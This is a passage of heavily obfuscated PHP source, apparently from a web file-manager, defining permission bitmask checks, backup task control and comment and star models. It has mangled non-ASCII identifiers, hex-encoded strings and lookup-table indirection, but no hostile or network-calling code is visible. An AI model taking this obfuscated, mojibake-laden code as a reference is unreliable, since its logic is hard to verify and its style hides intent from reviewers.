array($Ó´áŒÖÑ[$ÏÀø€ô»[86]], $¦ß„¤ëî, $ÏÀø€ô»[2058]); } else { $Ó´áŒÖÑ[$ÏÀø€ô»[86]] = $¦ß„¤ëî; } } if (isset($ù¯™Ìü‡[$ÏÀø€ô»[2050]]) && $ù¯™Ìü‡[$ÏÀø€ô»[2050]] > 0) { $Ó´áŒÖÑ[$ÏÀø€ô»[80]] = array($ÏÀø€ô»[2056], $ù¯™Ìü‡[$ÏÀø€ô»[2050]]); } if (isset($ù¯™Ìü‡[$ÏÀø€ô»[2051]]) && $ù¯™Ìü‡[$ÏÀø€ô»[2051]]) { $¦ß„¤ëî = array($ÏÀø€ô»[2057], $ù¯™Ìü‡[$ÏÀø€ô»[2051]]); if ($Ó´áŒÖÑ[$ÏÀø€ô»[80]]) { $Ó´áŒÖÑ[$ÏÀø€ô»[80]] = array($Ó´áŒÖÑ[$ÏÀø€ô»[80]], $¦ß„¤ëî, $ÏÀø€ô»[2058]); } else { $Ó´áŒÖÑ[$ÏÀø€ô»[80]] = $¦ß„¤ëî; } } if (isset($ù¯™Ìü‡[$ÏÀø€ô»[585]]) && $ù¯™Ìü‡[$ÏÀø€ô»[585]]) { $Ó´áŒÖÑ[] = array($ÏÀø€ô»[445] => $ù¯™Ìü‡[$ÏÀø€ô»[585]], $ÏÀø€ô»[443] => $ù¯™Ìü‡[$ÏÀø€ô»[585]], $ÏÀø€ô»[976] => $ÏÀø€ô»[1894]); } if (isset($ù¯™Ìü‡[$ÏÀø€ô»[404]]) && $ù¯™Ìü‡[$ÏÀø€ô»[404]]) { $î»›Ä¸„ = $ù¯™Ìü‡[$ÏÀø€ô»[404]]; if ($î»›Ä¸„ == $ÏÀø€ô»[79]) { $Ó´áŒÖÑ[$ÏÀø€ô»[402]] = 1; } else { if ($î»›Ä¸„ == $ÏÀø€ô»[2059]) { $Ó´áŒÖÑ[$ÏÀø€ô»[402]] = 0; } else { if ($î»›Ä¸„) { $î»›Ä¸„ = is_array($î»›Ä¸„) ? $î»›Ä¸„ : explode($ÏÀø€ô»[50], $î»›Ä¸„); $Ó´áŒÖÑ[$ÏÀø€ô»[404]] = array($ÏÀø€ô»[410], $î»›Ä¸„); $Ó´áŒÖÑ[$ÏÀø€ô»[402]] = 0; } } } } $this->_parseSearchParent($ù¯™Ìü‡, $Ó´áŒÖÑ); if (isset($ù¯™Ìü‡[$ÏÀø€ô»[1890]]) && trim($ù¯™Ìü‡[$ÏÀø€ô»[1890]])) { $“õ À² = trim($ù¯™Ìü‡[$ÏÀø€ô»[1890]]); $Æ°‘á“ª = explode($ÏÀø€ô»[53], $“õ À²); if (strlen($“õ À²) > 2 && (substr($“õ À², 0, 1) == $ÏÀø€ô»[117] && substr($“õ À², -1) == $ÏÀø€ô»[117]) || substr($“õ À², 0, 1) == $ÏÀø€ô»[58] && substr($“õ À², -1) == $ÏÀø€ô»[58]) { $“õ À² = substr($“õ À², 1, -1); $Æ°‘á“ª = array($“õ À²); } $Ó´áŒÖÑ[$ÏÀø€ô»[32]] = array(array($ÏÀø€ô»[535], $ÏÀø€ô»[1892] . $“õ À² . $ÏÀø€ô»[1892])); if (count($Æ°‘á“ª) > 1) { $Ó´áŒÖÑ[$ÏÀø€ô»[32]] = array(); foreach ($Æ°‘á“ª as $“‘¹¥ù©) { if (!trim($“‘¹¥ù©)) { continue; } $Ó´áŒÖÑ[$ÏÀø€ô»[32]][] = array($ÏÀø€ô»[535], $ÏÀø€ô»[1892] . trim($“‘¹¥ù©) . $ÏÀø€ô»[1892]); } } } return $Ó´áŒÖÑ; } private function _parseSearchParent($á´¥ÆÒî, &$îáÆè¿) { $©°ÆØ° =& $_SERVER[ì…™Î¶Ï]; if (!isset($á´¥ÆÒî[$©°ÆØ°[489]]) || !$á´¥ÆÒî[$©°ÆØ°[489]]) { return; } $Ñº‰ÓÏì = $this->pathInfo($á´¥ÆÒî[$©°ÆØ°[489]]); $ú³ğ¯ˆ = $Ñº‰ÓÏì[$©°ÆØ°[489]] . $©°ÆØ°[12] === $©°ÆØ°[190]; $š¡­©Üí = $Ñº‰ÓÏì[$©°ÆØ°[403]] == $©°ÆØ°[506]; $îáÆè¿[$©°ÆØ°[575]] = array($©°ÆØ°[535], $Ñº‰ÓÏì[$©°ÆØ°[512]] . $á´¥ÆÒî[$©°ÆØ°[489]] . $©°ÆØ°[536]); $¹íÌíÄÖ = isset($á´¥ÆÒî[$©°ÆØ°[1758]]) && in_array($©°ÆØ°[506], $á´¥ÆÒî[$©°ÆØ°[1758]]); if (!$¹íÌíÄÖ || !$š¡­©Üí || !$ú³ğ¯ˆ || !$Ñº‰ÓÏì[$©°ÆØ°[405]]) { return; } if (!AuthModel::authCheckRoot($Ñº‰ÓÏì[$©°ÆØ°[405]][$©°ÆØ°[406]])) { return; } $À‡°©·• = $Ñº‰ÓÏì[$©°ÆØ°[495]] . $©°ÆØ°[12]; if ($À‡°©·• == $©°ÆØ°[89]) { unset($îáÆè¿[$©°ÆØ°[575]]); $îáÆè¿[$©°ÆØ°[403]] = self::TYPE_GROUP; return; } $§ÏîåÉ = Model($©°ÆØ°[513])->groupChildrenAll($À‡°©·•); $¡şûéŞ = count($§ÏîåÉ); if ($¡şûéŞ <= 1) { return; } $ ¹“–Öô = array($©°ÆØ°[489] => 0, $©°ÆØ°[403] => self::TYPE_GROUP, $©°ÆØ°[495] => array($©°ÆØ°[7], $§ÏîåÉ)); $äš®êûÑ = $this->field($©°ÆØ°[2060])->where($ ¹“–Öô)->limit($¡şûéŞ)->select(); $îáÆè¿[$©°ÆØ°[575]] = array(); foreach ($äš®êûÑ as $Èİ®äÊ›) { $îáÆè¿[$©°ÆØ°[575]][] = array($©°ÆØ°[535], $©°ÆØ°[522] . $Èİ®äÊ›[$©°ÆØ°[394]] . $©°ÆØ°[536]); } $îáÆè¿[$©°ÆØ°[575]][] = $©°ÆØ°[1894]; } } goto cŸåäÒŞİ«; CÒöâ’Æ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $²“‘·œ¾ =& $_SERVER[ì…™Î¶Ï]; $»³Â™Ş = array(array($²“‘·œ¾[412] => LNG($²“‘·œ¾[1800]), $²“‘·œ¾[1801] => $²“‘·œ¾[1802], $²“‘·œ¾[1803] => 1, $²“‘·œ¾[1804] => 1, $²“‘·œ¾[1805] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($²“‘·œ¾[412] => LNG($²“‘·œ¾[1806]), $²“‘·œ¾[1801] => $²“‘·œ¾[1807], $²“‘·œ¾[1803] => 2, $²“‘·œ¾[1804] => 1, $²“‘·œ¾[1805] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($²“‘·œ¾[412] => LNG($²“‘·œ¾[1808]), $²“‘·œ¾[1801] => $²“‘·œ¾[1809], $²“‘·œ¾[1803] => 3, $²“‘·œ¾[1804] => 1, $²“‘·œ¾[1805] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($²“‘·œ¾[412] => LNG($²“‘·œ¾[1810]), $²“‘·œ¾[1801] => $²“‘·œ¾[1811], $²“‘·œ¾[1803] => 4, $²“‘·œ¾[1804] => 1, $²“‘·œ¾[1805] => self::AUTH_SHOW | self::AUTH_VIEW), array($²“‘·œ¾[412] => LNG($²“‘·œ¾[1812]), $²“‘·œ¾[1801] => $²“‘·œ¾[1813], $²“‘·œ¾[1803] => 5, $²“‘·œ¾[1804] => 1, $²“‘·œ¾[1805] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($²“‘·œ¾[412] => LNG($²“‘·œ¾[1814]), $²“‘·œ¾[1801] => $²“‘·œ¾[1815], $²“‘·œ¾[1803] => 6, $²“‘·œ¾[1804] => 1, $²“‘·œ¾[1805] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($²“‘·œ¾[412] => LNG($²“‘·œ¾[1816]), $²“‘·œ¾[1801] => $²“‘·œ¾[1817], $²“‘·œ¾[1803] => 7, $²“‘·œ¾[1804] => 1, $²“‘·œ¾[1805] => 0)); return $»³Â™Ş; } public static function authCheck($—³ºä, $·Ğ¯ÓãÁ) { $—³ºä = intval($—³ºä); if ($GLOBALS[$_SERVER[ì…™Î¶Ï][496]]) { return !0; } if ($—³ºä <= 0) { return !1; } if (($—³ºä & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($—³ºä & $·Ğ¯ÓãÁ); } public static function authCheckShow($¬­Ô¼å) { return self::authCheck($¬­Ô¼å, self::AUTH_SHOW); } public static function authCheckView($“ö¦Ÿ¦£) { return self::authCheck($“ö¦Ÿ¦£, self::AUTH_VIEW); } public static function authCheckDownload($‡ß¤Ìû) { return self::authCheck($‡ß¤Ìû, self::AUTH_DOWNLOAD); } public static function authCheckUpload($‡ç×ÀŠ) { return self::authCheck($‡ç×ÀŠ, self::AUTH_UPLOAD); } public static function authCheckEdit($ŸµúÇÀä) { return self::authCheck($ŸµúÇÀä, self::AUTH_EDIT); } public static function authCheckRemove($•¡ÅŠİ¢) { return self::authCheck($•¡ÅŠİ¢, self::AUTH_REMOVE); } public static function authCheckShare($Ä¬ÉÕÈ§) { return self::authCheck($Ä¬ÉÕÈ§, self::AUTH_SHARE); } public static function authCheckComment($Ú©û®óŠ) { return self::authCheck($Ú©û®óŠ, self::AUTH_COMMENT); } public static function authCheckEvent($×ñ—Ÿêû) { return self::authCheck($×ñ—Ÿêû, self::AUTH_EVENT); } public static function authCheckRoot($ÂüÓëä¸) { return self::authCheck($ÂüÓëä¸, self::AUTH_ROOT); } public static function authCheckAction($ôÒ™”Ü, $ıÔÔèåã) { $ó¯¼š¨ñ =& $_SERVER[ì…™Î¶Ï]; $Š½í“• = array($ó¯¼š¨ñ[1818] => self::AUTH_VIEW, $ó¯¼š¨ñ[1173] => self::AUTH_DOWNLOAD, $ó¯¼š¨ñ[108] => self::AUTH_UPLOAD, $ó¯¼š¨ñ[1769] => self::AUTH_EDIT, $ó¯¼š¨ñ[1768] => self::AUTH_REMOVE, $ó¯¼š¨ñ[1779] => self::AUTH_SHARE, $ó¯¼š¨ñ[349] => self::AUTH_COMMENT, $ó¯¼š¨ñ[1619] => self::AUTH_EVENT, $ó¯¼š¨ñ[1819] => self::AUTH_ROOT); if (!isset($Š½í“•[$ıÔÔèåã])) { return; } $Úìãê = $Š½í“•[$ıÔÔèåã]; $ôÒ™”Ü = intval($ôÒ™”Ü); if ($ôÒ™”Ü <= 0) { return !1; } if (($ôÒ™”Ü & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ôÒ™”Ü & $Úìãê); } public static function authDisable($±­øÃÏÃ, $ÃñĞÏÜ) { if (intval($±­øÃÏÃ) <= 0) { return 0; } return intval($±­øÃÏÃ) & ~$ÃñĞÏÜ; } public $optionType = "\x53\x79\x73\164\x65\155\56\163\x6f\165\162\x63\x65\x41\x75\164\150\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\x61\x75\x74\150", "\154\x61\142\145\154", "\x64\x69\163\160\x6c\x61\x79", "\163\171\x73\x74\145\x6d", "\x73\x6f\x72\x74"); public function initData() { $¾‚£‹µŒ = $this->authDefault(); foreach ($¾‚£‹µŒ as $»óƒ›¢) { $this->add($»óƒ›¢); } } public function findAuth($–ÑÇ½¢’, $ëÑì™„ô) { $·ğÃ·øÏ =& $_SERVER[ì…™Î¶Ï]; $ü›•ØŞ˜ = parent::listData(); foreach ($ü›•ØŞ˜ as $ÔØÉŞ„î) { $Å¶úÄóæ = intval($ÔØÉŞ„î[$·ğÃ·øÏ[405]]); if ($Å¶úÄóæ <= 0 || $ÔØÉŞ„î[$·ğÃ·øÏ[1820]] == 0) { continue; } if (($Å¶úÄóæ & $–ÑÇ½¢’) != $–ÑÇ½¢’) { continue; } if (($Å¶úÄóæ & $ëÑì™„ô) != 0) { continue; } return $ÔØÉŞ„î[$·ğÃ·øÏ[392]]; } return !1; } public function findAuthReadOnly() { $¼ÚóìÊú = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $öŞí™ùõ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¼ÚóìÊú, $öŞí™ùõ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($²³ÁÑ• = false, $¹Ìö™× = "\x73\x6f\x72\x74", $°òÉÂîÓ = false) { return parent::listData($²³ÁÑ•, $¹Ìö™×, $°òÉÂîÓ); } public function update($ò´ĞÚ¥, $Ô¢Å£¹) { $ÀÓŸöá =& $_SERVER[ì…™Î¶Ï]; $ñ¤ÈÖŞÑ = parent::listData($ò´ĞÚ¥); $ñ¨‰ìÛË = $this->findByName($Ô¢Å£¹[$ÀÓŸöá[32]]); if (!$ñ¤ÈÖŞÑ || $ñ¨‰ìÛË && $ñ¨‰ìÛË[$ÀÓŸöá[392]] != $ñ¤ÈÖŞÑ[$ÀÓŸöá[392]]) { return !1; } $this->filterAuth($Ô¢Å£¹[$ÀÓŸöá[405]]); return parent::update($ò´ĞÚ¥, $Ô¢Å£¹); } public function remove($²ë¹—ê) { $ËÚ¦Î÷ = parent::listData($²ë¹—ê); if (!$ËÚ¦Î÷ || $ËÚ¦Î÷[$_SERVER[ì…™Î¶Ï][1250]]) { return !1; } return parent::remove($²ë¹—ê); } public function add($«òšµôÑ = array()) { $ıõóğùë =& $_SERVER[ì…™Î¶Ï]; if ($this->findByName($«òšµôÑ[$ıõóğùë[32]])) { return !1; } $‘ÕÁàñû = array($ıõóğùë[32] => $ıõóğùë[12], $ıõóğùë[405] => 1, $ıõóğùë[1821] => $ıõóğùë[1809], $ıõóğùë[1820] => 1, $ıõóğùë[1250] => 0, $ıõóğùë[1822] => 0); $«òšµôÑ = array_merge($‘ÕÁàñû, $«òšµôÑ); $«òšµôÑ[$ıõóğùë[1822]] = $this->getSort(); $this->filterAuth($«òšµôÑ[$ıõóğùë[405]]); return parent::insert($«òšµôÑ); } private function getSort() { $Ãù¬Îµœ =& $_SERVER[ì…™Î¶Ï]; $ùôßûÙ = parent::listData(); $·—„Äñˆ = array_to_keyvalue($ùôßûÙ, $Ãù¬Îµœ[12], $Ãù¬Îµœ[1822]); return empty($·—„Äñˆ) ? 0 : max($·—„Äñˆ) + 1; } private function filterAuth(&$ùÎË¹ºÅ) { if (!$ùÎË¹ºÅ) { return; } $æî˜ªÛ› = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $‘ÔÏÂ’” = array(); foreach ($æî˜ªÛ› as $‘¾”ã×¹) { if ($ùÎË¹ºÅ & $‘¾”ã×¹) { $‘ÔÏÂ’”[] = $‘¾”ã×¹; } } if (in_array(self::AUTH_ROOT, $‘ÔÏÂ’”)) { $ùÎË¹ºÅ = array_sum($æî˜ªÛ›); return; } $ã‹¸•·² = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($‘ÔÏÂ’” as $‘¾”ã×¹) { if (isset($ã‹¸•·²[$‘¾”ã×¹])) { $‘ÔÏÂ’” = array_merge($‘ÔÏÂ’”, $ã‹¸•·²[$‘¾”ã×¹]); } } $‘ÔÏÂ’”[] = self::AUTH_SHOW; $ùÎË¹ºÅ = array_sum(array_unique($‘ÔÏÂ’”)); } public function sort($ï€œÀƒ§, $ÄêÉ‡©Ğ) { return parent::update($ï€œÀƒ§, $ÄêÉ‡©Ğ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\142\141\143\x6b\165\160\x4c\151\163\164"; public $field = array("\x69\157", "\156\141\x6d\145", "\x73\x74\141\164\165\163", "\143\x6f\x6e\164\145\x6e\x74", "\155\141\156\165\x61\x6c", "\162\145\x73\165\154\164", "\164\x69\155\x65\x46\x72\x6f\155", "\164\151\155\145\x54\157"); public function config() { $Á€¼è =& $_SERVER[ì…™Î¶Ï]; $úĞØ²« = Model($Á€¼è[745])->get($Á€¼è[755]); $úĞØ²« = json_decode($úĞØ²«, !0); $úĞØ²« = is_array($úĞØ²«) ? $úĞØ²« : array(); if (!isset($úĞØ²«[$Á€¼è[730]])) { $úĞØ²«[$Á€¼è[730]] = $Á€¼è[89]; } unset($úĞØ²«[$Á€¼è[1601]]); Action($Á€¼è[1823])->taskInit(); Model($Á€¼è[1600])->cacheClear(); $¯âè†…Ö = $Á€¼è[1824]; $óÑü¡ ø = Model($Á€¼è[1825])->findByKey($Á€¼è[1619], $¯âè†…Ö); if (!$óÑü¡ ø) { $óÑü¡ ø = array(); } if (isset($óÑü¡ ø[$Á€¼è[196]])) { $óÑü¡ ø[$Á€¼è[196]] = json_decode($óÑü¡ ø[$Á€¼è[196]], !0); } if (isset($úĞØ²«[$Á€¼è[196]])) { $óÑü¡ ø[$Á€¼è[196]][$Á€¼è[1604]] = $úĞØ²«[$Á€¼è[196]]; unset($úĞØ²«[$Á€¼è[196]]); } return array_merge($óÑü¡ ø, $úĞØ²«); } public function listData($ÊÑÃ®­ô = false, $­òŒ½£Û = "\155\157\144\x69\146\171\x54\151\x6d\145", $¢û—‹ = false) { return parent::listData($ÊÑÃ®­ô, $­òŒ½£Û, !0); } public function lastItem() { $Œ¶áÇø¸ = $this->listData(); return !empty($Œ¶áÇø¸[0]) ? $Œ¶áÇø¸[0] : null; } public function kill($«¥’øÆ) { $‡±Åº»ó =& $_SERVER[ì…™Î¶Ï]; $†¼ªóÑ› = $this->listData($«¥’øÆ); if (!$†¼ªóÑ› || empty($†¼ªóÑ›[$‡±Åº»ó[32]])) { return !0; } Task::kill($‡±Åº»ó[754]); Task::kill($‡±Åº»ó[775]); Task::kill($‡±Åº»ó[784]); $ÚÕê±Ä = $†¼ªóÑ›[$‡±Åº»ó[32]]; $¾¬Û¿ğÛ = TEMP_FILES . $‡±Åº»ó[753] . $ÚÕê±Ä . $‡±Åº»ó[8]; IO::remove($¾¬Û¿ğÛ, !1); return $this->remove($«¥’øÆ); } public function remove($Ğˆ™óé¡) { $¶ççèŸÉ = $this->listData($Ğˆ™óé¡); if (!$¶ççèŸÉ) { return !0; } return $this->backupRemove($¶ççèŸÉ); } private function backupRemove($¶ºÊööç) { parent::remove($¶ºÊööç[$_SERVER[ì…™Î¶Ï][392]]); $ç¢´œÎ× = $this->backupPath($¶ºÊööç); IO::remove($ç¢´œÎ×, !1); return !0; } private function backupPath($æÜìÂ´) { $ï‡ÓŸ¶¬ =& $_SERVER[ì…™Î¶Ï]; $éÌª©€» = $æÜìÂ´[$ï‡ÓŸ¶¬[32]]; $çÏÍ˜§ = Model($ï‡ÓŸ¶¬[745])->get($ï‡ÓŸ¶¬[746]); $´¹ğÂ¹ã = substr(md5($ï‡ÓŸ¶¬[747] . $çÏÍ˜§ . $éÌª©€»), 0, 8); return "\173\x69\157\72{$æÜìÂ´[$ï‡ÓŸ¶¬[727]]}\175\57\x64\x61\x74\141\142\141\163\145\57\142\141\x63\153\x75\160\x2f" . $éÌª©€» . $ï‡ÓŸ¶¬[11] . $´¹ğÂ¹ã; } public function start() { $ùª©Ì†Õ =& $_SERVER[ì…™Î¶Ï]; if ($GLOBALS[$ùª©Ì†Õ[6]][$ùª©Ì†Õ[90]][$ùª©Ì†Õ[1826]] != $ùª©Ì†Õ[89]) { return !0; } $ÁÅéÌ°ƒ = $this->config(); if (!$ÁÅéÌ°ƒ || $ÁÅéÌ°ƒ[$ùª©Ì†Õ[1601]] != $ùª©Ì†Õ[89]) { return !1; } $›€º„Ôš = $this->process(); foreach ($›€º„Ôš as $•öò¬ë¦) { if ($•öò¬ë¦) { return Task::restart($•öò¬ë¦[$ùª©Ì†Õ[392]]); } } $ÒÏ÷ÀüÀ = new Backup(); $¹µ›àÀâ = $ÒÏ÷ÀüÀ->db(); if ($¹µ›àÀâ) { $¹µ›àÀâ = $ÒÏ÷ÀüÀ->dbFile(); if ($¹µ›àÀâ && $ÁÅéÌ°ƒ[$ùª©Ì†Õ[730]] == $ùª©Ì†Õ[190]) { $¹µ›àÀâ = $ÒÏ÷ÀüÀ->file(); } } Backup::set(array($ùª©Ì†Õ[725] => 1, $ùª©Ì†Õ[487] => time())); return !0; } public function process() { $ê¾šŞ’š =& $_SERVER[ì…™Î¶Ï]; $Æ­ŞØ» = array($ê¾šŞ’š[733] => Task::get($ê¾šŞ’š[754]), $ê¾šŞ’š[737] => Task::get($ê¾šŞ’š[775]), $ê¾šŞ’š[192] => Task::get($ê¾šŞ’š[784])); $âéûèÏÖ = !1; foreach ($Æ­ŞØ» as &$°É„ªûø) { if ($âéûèÏÖ) { $°É„ªûø = !1; continue; } if ($°É„ªûø) { $™Œ·á¡ = intval(_get($°É„ªûø, $ê¾šŞ’š[1636], 0)); if (time() - $™Œ·á¡ > 7200) { Task::kill($°É„ªûø[$ê¾šŞ’š[392]]); $âéûèÏÖ = !0; $°É„ªûø = !1; } } } return $Æ­ŞØ»; } public function restore() { $¬¹©ùÙ =& $_SERVER[ì…™Î¶Ï]; ActionCall($¬¹©ùÙ[1036], !0, 1); ActionCall($¬¹©ùÙ[1036], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\145\x6e\164"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\141\x6d\145" => "\143\157\155\155\x65\156\x74\x5f\x6d\x65\164\x61", "\x6d\145\164\x61\106\x69\145\154\144" => "\x63\x6f\155\155\x65\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($öŞ–²˜‘) { $–—Öíû¸ =& $_SERVER[ì…™Î¶Ï]; if ($öŞ–²˜‘[$–—Öíû¸[1827]]) { $ÂßÌÈÏå = $this->where(array($–—Öíû¸[1828] => $öŞ–²˜‘[$–—Öíû¸[1827]]))->find(); if (!$ÂßÌÈÏå || $ÂßÌÈÏå[$–—Öíû¸[403]] != $öŞ–²˜‘[$–—Öíû¸[403]] || $ÂßÌÈÏå[$–—Öíû¸[495]] != $öŞ–²˜‘[$–—Öíû¸[495]]) { return !1; } $this->where(array($–—Öíû¸[1828] => $öŞ–²˜‘[$–—Öíû¸[1827]]))->setAdd($–—Öíû¸[1829], 1); } $öŞ–²˜‘[$–—Öíû¸[1830]] = 0; $öŞ–²˜‘[$–—Öíû¸[1829]] = 0; $öŞ–²˜‘[$–—Öíû¸[725]] = 1; return $this->add($öŞ–²˜‘); } public function commentCount($œúƒ”ıÄ, $ñˆœ“©, $Æï„˜¢¢ = false) { $ó©¯é¯ï =& $_SERVER[ì…™Î¶Ï]; if (!$œúƒ”ıÄ) { return array(); } if (is_string($œúƒ”ıÄ) || is_int($œúƒ”ıÄ)) { $œúƒ”ıÄ = array($œúƒ”ıÄ); } $õ¯Ëé†ˆ = array($ó©¯é¯ï[495], $ó©¯é¯ï[1831] => $ó©¯é¯ï[491]); $Ññå‰›‚ = array($ó©¯é¯ï[495] => array($ó©¯é¯ï[7], $œúƒ”ıÄ), $ó©¯é¯ï[403] => $ñˆœ“©); if ($Æï„˜¢¢) { $Ññå‰›‚[$ó©¯é¯ï[1631]] = $Æï„˜¢¢; } $¬Ìè±• = $this->field($õ¯Ëé†ˆ)->where($Ññå‰›‚)->group($ó©¯é¯ï[495])->select(); return array_to_keyvalue($¬Ìè±•, $ó©¯é¯ï[495], $ó©¯é¯ï[491]); } public function starTarget($¸“Ê™È, $®ııØğ‹) { $ÊÏÈ„‹ë =& $_SERVER[ì…™Î¶Ï]; $®ûÏÄº = $¸“Ê™È + self::TYPE_STAR_OFFSET; $¥çÜ—Ó˜ = array($ÊÏÈ„‹ë[1631] => USER_ID, $ÊÏÈ„‹ë[403] => $®ûÏÄº, $ÊÏÈ„‹ë[495] => $®ııØğ‹); $¬Õ¿Š¤º = $this->where($¥çÜ—Ó˜)->find(); if ($¬Õ¿Š¤º) { return $this->where(array($ÊÏÈ„‹ë[392] => $¬Õ¿Š¤º[$ÊÏÈ„‹ë[392]]))->delete(); } $•¹‘áÍœ = array($ÊÏÈ„‹ë[1827] => 0, $ÊÏÈ„‹ë[1631] => USER_ID, $ÊÏÈ„‹ë[725] => 1, $ÊÏÈ„‹ë[730] => $ÊÏÈ„‹ë[12], $ÊÏÈ„‹ë[403] => $®ûÏÄº, $ÊÏÈ„‹ë[495] => $®ııØğ‹, $ÊÏÈ„‹ë[1830] => 0, $ÊÏÈ„‹ë[1829] => 0); return $this->add($•¹‘áÍœ); } public function starTargetCount($¬ûù›²â, $êÂç “) { $ØåàËÕ =& $_SERVER[ì…™Î¶Ï]; $©®Éü‘÷ = $êÂç “ + self::TYPE_STAR_OFFSET; $áÕ¸Œç = $this->commentCount($¬ûù›²â, $©®Éü‘÷); $şõËÅâñ = $this->commentCount($¬ûù›²â, $©®Éü‘÷, USER_ID); return array($ØåàËÕ[1832] => $áÕ¸Œç, $ØåàËÕ[1833] => $şõËÅâñ); } public function starTargetUserList($§â¦•Ù, $ÖÆ–›Ğ¨) { $àŠª¡ =& $_SERVER[ì…™Î¶Ï]; $·„Úòüş = $§â¦•Ù + self::TYPE_STAR_OFFSET; $—‰¾¤‹ = array($àŠª¡[495] => $ÖÆ–›Ğ¨, $àŠª¡[403] => $·„Úòüş); $‚¡“»º» = $this->where($—‰¾¤‹)->count(); $²şİŞ‚‰ = array($àŠª¡[250] => $‚¡“»º», $àŠª¡[1834] => array()); if (!$‚¡“»º») { return $²şİŞ‚‰; } $‹™şÕî = $this->field($àŠª¡[1631])->where($—‰¾¤‹)->limit(500)->select(); $‹™şÕî = array_to_keyvalue($‹™şÕî, $àŠª¡[12], $àŠª¡[1631]); $²şİŞ‚‰[$àŠª¡[1834]] = Model($àŠª¡[504])->userListInfo($‹™şÕî); return $²şİŞ‚‰; } public function prasiseUserList($¢«å™†) { $çï¤ï‰ =& $_SERVER[ì…™Î¶Ï]; $‚µ¾ŠÍé = array($çï¤ï‰[1835] => $¢«å™†); $ê‚¾‘” = $this->where($‚µ¾ŠÍé)->find(); $ñ•½šıÔ = _get($ê‚¾‘”, $çï¤ï‰[1830], 0); $—ŠáÜ‘ò = array($çï¤ï‰[250] => $ñ•½šıÔ, $çï¤ï‰[1834] => array()); if (!$ñ•½šıÔ) { return $—ŠáÜ‘ò; } $‡É”¼÷á = Model($çï¤ï‰[1836])->field($çï¤ï‰[1631])->where($‚µ¾ŠÍé)->limit(500)->select(); $‡É”¼÷á = array_to_keyvalue($‡É”¼÷á, $çï¤ï‰[12], $çï¤ï‰[1631]); $—ŠáÜ‘ò[$çï¤ï‰[1834]] = Model($çï¤ï‰[504])->userListInfo($‡É”¼÷á); return $—ŠáÜ‘ò; } public function remove($¶¦Ê¤ì­) { $şöôÃì =& $_SERVER[ì…™Î¶Ï]; $õîøÓÚ = array($şöôÃì[1828] => $¶¦Ê¤ì­); $ÆÁµÕÄ¬ = $this->where($õîøÓÚ)->find(); if ($ÆÁµÕÄ¬[$şöôÃì[1827]]) { $this->where(array($şöôÃì[1828] => $ÆÁµÕÄ¬[$şöôÃì[1827]]))->setAdd($şöôÃì[1829], -1); } return $this->where($õîøÓÚ)->delete(); } public function edit($ºÉÑ¨Á , $·ç³…êÖ) { $‹«ôÑÛ =& $_SERVER[ì…™Î¶Ï]; $Á—Úí¶‡ = array($‹«ôÑÛ[1828] => $ºÉÑ¨Á ); return $this->where($Á—Úí¶‡)->save(array($‹«ôÑÛ[1837] => $·ç³…êÖ)); } public function prasise($ˆ±ÚõùÀ) { $ıŒŠÇşğ =& $_SERVER[ì…™Î¶Ï]; $‰Ñ¸ÆÕ¯ = Model($ıŒŠÇşğ[1838]); $²ÊæÁè® = array($ıŒŠÇşğ[1828] => $ˆ±ÚõùÀ, $ıŒŠÇşğ[1622] => USER_ID); $åÜ«‘ = $‰Ñ¸ÆÕ¯->where($²ÊæÁè®)->find(); if (!$åÜ«‘) { $‰Ñ¸ÆÕ¯->add($²ÊæÁè®); $ô–±¶éã = $this->where(array($ıŒŠÇşğ[1828] => 